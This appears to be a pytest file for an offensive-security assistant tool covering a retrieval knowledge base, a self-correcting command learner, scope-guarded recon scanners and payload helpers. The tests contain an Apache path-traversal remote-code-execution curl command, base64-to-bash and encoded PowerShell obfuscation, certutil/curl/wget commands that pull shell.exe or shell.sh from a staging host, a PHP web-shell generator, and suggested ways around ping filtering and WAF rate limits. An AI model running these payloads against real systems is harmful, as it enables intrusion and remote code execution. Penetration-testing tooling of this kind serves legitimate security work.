"""
Unit and integration tests for NeuroShell Dual RAG, Recursive Learning Engine,
Kaggle Training Orchestrator, and Recon Toolchains.
"""

import os
import tempfile
from pathlib import Path
import pytest

from editions.cyber.payloads.obfuscator import PayloadObfuscator
from editions.cyber.payloads.web_shells import WebShellGenerator
from editions.cyber.recon.nmap_runner import NmapRunner
from editions.cyber.recon.nuclei_scanner import NucleiScanner
from editions.cyber.recon.web_fuzzer import WebFuzzer
from editions.cyber.scope_guard import ScopeGuard
from editions.cyber.staging.pull_builder import PullCommandBuilder
from editions.cyber.target_graph import TargetGraph
from editions.standard.dev_patterns import translate_dev_intent
from intelligence.rag_engine import DualRAGEngine, RAGDocument
from intelligence.recursive_learner import FailureCategory, RecursiveLearner
from scripts.train.kaggle_trainer import KaggleTrainer


class TestDualRAGEngine:
    """Test suite for local offline Dual RAG Knowledge Base."""

    def test_rag_initialization_and_builtins(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            db_path = Path(tmp_dir) / "test_rag.db"
            rag = DualRAGEngine(db_path=db_path)

            # Built-ins should be automatically seeded
            res = rag.search("nmap stealth", top_k=3)
            assert len(res) > 0
            assert any("nmap" in r.document.title.lower() for r in res)

    def test_rag_custom_index_and_retrieval(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            db_path = Path(tmp_dir) / "test_rag.db"
            rag = DualRAGEngine(db_path=db_path)

            doc = RAGDocument(
                doc_id="custom_cve_exploit",
                category="web_security",
                title="Custom Apache Path Traversal",
                content="Apache HTTP Server versions 2.4.49 and 2.4.50 path traversal vulnerability payload.",
                commands=["curl -s --path-as-is -d 'echo vulnerable' 'http://TARGET/cgi-bin/.%2e/.%2e/bin/sh'"],
                tags=["apache", "traversal", "cve", "web"],
            )
            rag.index_document(doc)

            results = rag.search("apache traversal", category="web_security", top_k=2)
            assert len(results) > 0
            assert results[0].document.doc_id == "custom_cve_exploit"
            assert "curl" in results[0].suggested_command

    def test_rag_formatting(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            db_path = Path(tmp_dir) / "test_rag.db"
            rag = DualRAGEngine(db_path=db_path)
            res = rag.search("vim sudo escape", top_k=1)
            formatted = rag.format_results(res)
            assert "Vim" in formatted or "VIM" in formatted
            assert "Command:" in formatted


class TestRecursiveLearningEngine:
    """Test suite for Recursive Learning, delta fixes and AutoDream memory."""

    def test_diagnose_nmap_ping_probe_block(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            db_path = Path(tmp_dir) / "learned.db"
            learner = RecursiveLearner(db_path=db_path)

            cmd = "nmap -sV 10.10.10.5"
            stdout = "Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn"
            delta = learner.analyze_result(cmd, returncode=1, stdout=stdout, stderr="")

            assert delta is not None
            assert delta.failure_category == FailureCategory.NETWORK_FILTERED
            assert "-Pn" in delta.suggested_command

    def test_diagnose_waf_rate_limit(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            db_path = Path(tmp_dir) / "learned.db"
            learner = RecursiveLearner(db_path=db_path)

            cmd = "gobuster dir -u http://10.10.10.5 -w common.txt"
            stdout = "Error: 429 Too Many Requests received from Cloudflare WAF"
            delta = learner.analyze_result(cmd, returncode=1, stdout=stdout, stderr="")

            assert delta is not None
            assert delta.failure_category == FailureCategory.WAF_RATE_LIMIT
            assert "--delay" in delta.suggested_command

    def test_autodream_memory_consolidation(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            db_path = Path(tmp_dir) / "learned.db"
            learner = RecursiveLearner(db_path=db_path)

            orig = "nmap 10.10.10.5"
            fixed = "nmap -Pn 10.10.10.5"

            # Consolidate success
            learner.consolidate_success("nmap 10.10.10.5", orig, fixed)

            # Instant recall (<0.1ms)
            recalled = learner.get_cached_fix("nmap 10.10.10.5")
            assert recalled == fixed

            # Generalizes to another target IP via signature normalization
            recalled_gen = learner.get_cached_fix("nmap 192.168.1.100")
            assert recalled_gen == fixed


class TestReconRunnersAndScope:
    """Test suite for Nmap, WebFuzzer, and Nuclei runners with ScopeGuard."""

    def test_nmap_runner_scope_blocking(self):
        scope = ScopeGuard(["10.10.10.0/24"])
        runner = NmapRunner(scope_guard=scope)

        # Out-of-scope scan must be rejected immediately without spawning process
        res = runner.scan("8.8.8.8")
        assert not res.success
        assert "Scope Violation" in res.formatted_output
        assert res.returncode == -1

    def test_web_fuzzer_scope_blocking(self):
        scope = ScopeGuard(["10.10.10.5"])
        fuzzer = WebFuzzer(scope_guard=scope)

        res = fuzzer.fuzz_directories("http://google.com")
        assert not res.success
        assert "Scope Violation" in res.formatted_output

    def test_nuclei_scanner_scope_blocking(self):
        scope = ScopeGuard(["192.168.1.50"])
        scanner = NucleiScanner(scope_guard=scope)

        res = scanner.scan("http://192.168.1.100")
        assert not res.success
        assert "Scope Violation" in res.formatted_output


class TestPayloadsAndStagingConveniences:
    """Test suite for obfuscator, pull builder, webshell generator."""

    def test_payload_obfuscator(self):
        cmd = "whoami"
        b64 = PayloadObfuscator.to_base64(cmd)
        assert b64 == "d2hvYW1p"

        ps_enc = PayloadObfuscator.to_powershell_encoded_command("Get-Process")
        assert "-Enc" in ps_enc
        assert "powershell.exe" in ps_enc

        bash_wrap = PayloadObfuscator.to_bash_base64_wrap("id")
        assert "| base64 -d | bash" in bash_wrap

    def test_pull_command_builder(self):
        cmds_win = PullCommandBuilder.for_windows("http://10.10.10.5:8000/shell.exe", "test.exe")
        assert "powershell_irm" in cmds_win
        assert "certutil" in cmds_win
        assert "certutil.exe" in cmds_win["certutil"]

        cmds_nix = PullCommandBuilder.for_linux("http://10.10.10.5:8000/shell.sh", "test.sh")
        assert "curl" in cmds_nix
        assert "wget" in cmds_nix

    def test_webshell_generator(self):
        php_res = WebShellGenerator.generate_php(param="testcmd")
        assert php_res.success
        assert "testcmd" in php_res.raw_payload


class TestStandardDevPatterns:
    """Test suite for developer intent translations."""

    def test_polyglot_and_git_translations(self):
        assert translate_dev_intent("undo commit") == "git reset --soft HEAD~1"
        assert translate_dev_intent("soft undo") == "git reset --soft HEAD~1"
        assert translate_dev_intent("revert commit 1234abc") == "git revert --no-edit 1234abc"
        assert translate_dev_intent("git reflog") == "git reflog -n 15"
        assert translate_dev_intent("delete repo user/repo") == "gh repo delete user/repo --yes"
        assert translate_dev_intent("run main.py") == "run main.py"
        assert translate_dev_intent("compile main.cpp") == "compile main.cpp"


class TestKaggleTrainingOrchestrator:
    """Test suite for Kaggle CLI training orchestrator logic."""

    def test_kaggle_auth_check(self):
        ok, msg = KaggleTrainer.check_auth()
        assert ok
        assert "abneeshsingh" in msg

    def test_kaggle_status_check(self):
        st = KaggleTrainer.get_status()
        assert st in ("COMPLETE", "RUNNING", "QUEUED", "ERROR")
